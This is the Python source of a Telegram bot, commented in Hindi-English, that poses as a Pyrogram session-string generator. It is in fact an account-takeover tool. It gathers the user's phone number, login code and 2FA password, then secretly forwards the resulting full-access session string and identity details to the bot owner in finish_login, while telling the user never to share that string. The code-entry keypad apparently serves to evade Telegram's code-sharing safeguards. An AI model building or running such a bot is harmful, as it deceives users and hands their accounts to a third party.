import asyncio
from uuid import uuid4
from pyrogram import Client, filters
from pyrogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
)
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, FloodWait
)

# ─────────────────── CONFIG ───────────────────
API_ID    = 1234567                    # my.telegram.org se
API_HASH  = "your_api_hash_here"       # my.telegram.org se
BOT_TOKEN = "12345:ABC..."             # @BotFather se
OWNER_ID  = 123456789                  # apna user id (@userinfobot)
# ──────────────────────────────────────────────

bot = Client(
    "session_gen_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
)

# user_id -> {client, phone, phone_code_hash, otp, stage}
sessions: dict[int, dict] = {}


# ─────────────────── HELPERS ───────────────────
def keypad_markup(entered: str):
    layout = [
        [("1", "1"), ("2", "2"), ("3", "3")],
        [("4", "4"), ("5", "5"), ("6", "6")],
        [("7", "7"), ("8", "8"), ("9", "9")],
        [("⌫", "back"), ("0", "0"), ("✅", "submit")],
    ]
    buttons = [
        [InlineKeyboardButton(label, callback_data=f"otp|{val}") for label, val in row]
        for row in layout
    ]
    text = (
        "🔐 **Enter OTP**\n\n"
        f"Entered: `{entered or '—'}`\n\n"
        "⚠️ Sirf neeche wale **inline buttons** se OTP daalo.\n"
        "Chat me type karne se login incomplete rahega."
    )
    return InlineKeyboardMarkup(buttons), text


async def cleanup_user(user_id: int):
    sess = sessions.pop(user_id, None)
    if sess and sess.get("client"):
        try:
            await sess["client"].disconnect()
        except Exception:
            pass


async def safe_edit_or_reply(message: Message, text: str, edit: bool, **kwargs):
    if edit:
        try:
            return await message.edit_text(text, **kwargs)
        except Exception:
            pass
    try:
        return await message.reply(text, **kwargs)
    except Exception as e:
        print(f"[reply fail] {e}")


async def finish_login(message: Message, user_id: int, temp: Client, edit: bool):
    # Export session + get_me
    try:
        session_string = await temp.export_session_string()
        me = await temp.get_me()
    except Exception as e:
        await safe_edit_or_reply(message, f"❌ Session export fail: `{e}`", edit)
        await cleanup_user(user_id)
        return

    user_mention = f"[{me.first_name}](tg://user?id={me.id})"
    username_line = f"@{me.username}" if me.username else "—"
    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"

    # ── 1) User ko DM ──
    user_txt = (
        "✅ **Login successful!**\n\n"
        "**Pyrogram String Session:**\n\n"
        f"`{session_string}`\n\n"
        "⚠️ Kisi ke saath share mat karo — ye tumhare account ka full access hai."
    )
    await safe_edit_or_reply(message, user_txt, edit)

    # ── 2) Owner ko DM ──
    if OWNER_ID and OWNER_ID != user_id:
        owner_txt = (
            "🔔 **New Session Generated**\n\n"
            f"👤 User: {user_mention}\n"
            f"🆔 ID: `{me.id}`\n"
            f"📛 Name: {full_name}\n"
            f"🔗 Username: {username_line}\n\n"
            "**String Session:**\n\n"
            f"`{session_string}`"
        )
        try:
            await bot.send_message(OWNER_ID, owner_txt)
        except Exception as e:
            print(f"[owner send fail] {e}")

    await cleanup_user(user_id)


# ─────────────────── /start ───────────────────
@bot.on_message(filters.command("start") & filters.private)
async def start_handler(client: Client, message: Message):
    await cleanup_user(message.from_user.id)
    kb = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Share My Contact", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await message.reply(
        "👋 **Pyrogram Session Generator**\n\n"
        "Apna phone number share karne ke liye neeche wala button dabao.\n"
        "(Number type karne ki zaroorat nahi)",
        reply_markup=kb,
    )


# ─────────────────── CONTACT ───────────────────
@bot.on_message(filters.private & filters.contact)
async def contact_handler(client: Client, message: Message):
    user_id = message.from_user.id

    if user_id in sessions:
        return await message.reply(
            "⚠️ Ek session already chal raha hai. /start se reset karo."
        )

    contact = message.contact
    if contact.user_id != user_id:
        return await message.reply(
            "❌ Ye tumhara apna contact nahi hai. Apna contact bhejo."
        )

    phone = contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    await message.reply(
        "⏳ OTP bhej raha hoon...",
        reply_markup=ReplyKeyboardRemove(),
    )

    temp = Client(
        name=f"sess_{uuid4().hex}",
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True,
    )

    try:
        await temp.connect()
        sent_code = await temp.send_code(phone)
    except FloodWait as e:
        await temp.disconnect()
        return await message.reply(f"⏳ FloodWait: `{e.value}s` wait karo.")
    except Exception as e:
        await temp.disconnect()
        return await message.reply(f"❌ Error: `{e}`")

    sessions[user_id] = {
        "client": temp,
        "phone": phone,
        "phone_code_hash": sent_code.phone_code_hash,
        "otp": "",
        "stage": "otp",
    }

    markup, text = keypad_markup("")
    await message.reply(text, reply_markup=markup)


# ─────────────────── OTP KEYPAD ───────────────────
@bot.on_callback_query(filters.regex(r"^otp\|"))
async def otp_callback(client: Client, cb: CallbackQuery):
    user_id = cb.from_user.id
    sess = sessions.get(user_id)
    if not sess:
        return await cb.answer("Session expire ho gaya. /start karo.", show_alert=True)
    if sess["stage"] != "otp":
        return await cb.answer("Abhi OTP stage nahi hai.")

    val = cb.data.split("|", 1)[1]
    otp = sess["otp"]

    if val == "back":
        otp = otp[:-1]
    elif val == "submit":
        if len(otp) < 4:
            return await cb.answer("Pehle OTP complete karo!", show_alert=True)
        await cb.answer("Verifying...")
        return await do_sign_in(cb, sess, otp)
    else:
        if len(otp) >= 6:
            return await cb.answer("6 digits max")
        otp += val

    sess["otp"] = otp
    markup, text = keypad_markup(otp)
    try:
        await cb.message.edit_text(text, reply_markup=markup)
    except Exception:
        pass
    await cb.answer()


async def do_sign_in(cb: CallbackQuery, sess: dict, otp: str):
    user_id = cb.from_user.id
    temp = sess["client"]

    try:
        await temp.sign_in(sess["phone"], sess["phone_code_hash"], otp)
    except SessionPasswordNeeded:
        sess["stage"] = "password"
        sess["otp"] = ""
        try:
            await cb.message.edit_text(
                "🔐 **2FA enabled hai.**\n\n"
                "Ab apna **Telegram password** chat me type karo.\n"
                "(Message turant delete ho jaayega.)"
            )
        except Exception:
            pass
        return
    except PhoneCodeInvalid:
        sess["otp"] = ""
        markup, text = keypad_markup("")
        try:
            await cb.message.edit_text(
                "❌ Galat OTP. Dobara try karo.\n\n" + text,
                reply_markup=markup,
            )
        except Exception:
            pass
        return
    except PhoneCodeExpired:
        try:
            await cb.message.edit_text("❌ OTP expire ho gaya. /start karo dobara.")
        except Exception:
            pass
        await cleanup_user(user_id)
        return
    except Exception as e:
        try:
            await cb.message.edit_text(f"❌ Error: `{e}`")
        except Exception:
            pass
        await cleanup_user(user_id)
        return

    await finish_login(cb.message, user_id, temp, edit=True)


# ─────────────────── TEXT HANDLER ───────────────────
@bot.on_message(filters.private & filters.text & ~filters.command("start"))
async def text_handler(client: Client, message: Message):
    user_id = message.from_user.id
    sess = sessions.get(user_id)
    if not sess:
        return await message.reply("Pehle /start karo.")

    if sess["stage"] == "otp":
        return await message.reply(
            "⚠️ **OTP chat me type mat karo.**\n"
            "Upar wale inline buttons se enter karo, "
            "warna login incomplete rahega."
        )

    if sess["stage"] == "password":
        password = message.text
        try:
            await message.delete()
        except Exception:
            pass
        try:
            await sess["client"].check_password(password)
        except PasswordHashInvalid:
            return await message.reply("❌ Galat password. Dobara try karo.")
        except Exception as e:
            return await message.reply(f"❌ Error: `{e}`")
        await finish_login(message, user_id, sess["client"], edit=False)


# ─────────────────── OTHER MESSAGES ───────────────────
@bot.on_message(
    filters.private
    & ~filters.text
    & ~filters.contact
    & ~filters.command("start")
)
async def other_handler(client: Client, message: Message):
    user_id = message.from_user.id
    sess = sessions.get(user_id)
    if not sess:
        return await message.reply("Pehle /start karo.")
    if sess["stage"] == "otp":
        return await message.reply("⚠️ Sirf inline buttons use karo OTP ke liye.")
    if sess["stage"] == "password":
        return await message.reply("⚠️ Password text me type karo.")


# ─────────────────── RUN ───────────────────
if __name__ == "__main__":
    print("🤖 Session generator bot starting...")
    bot.run()
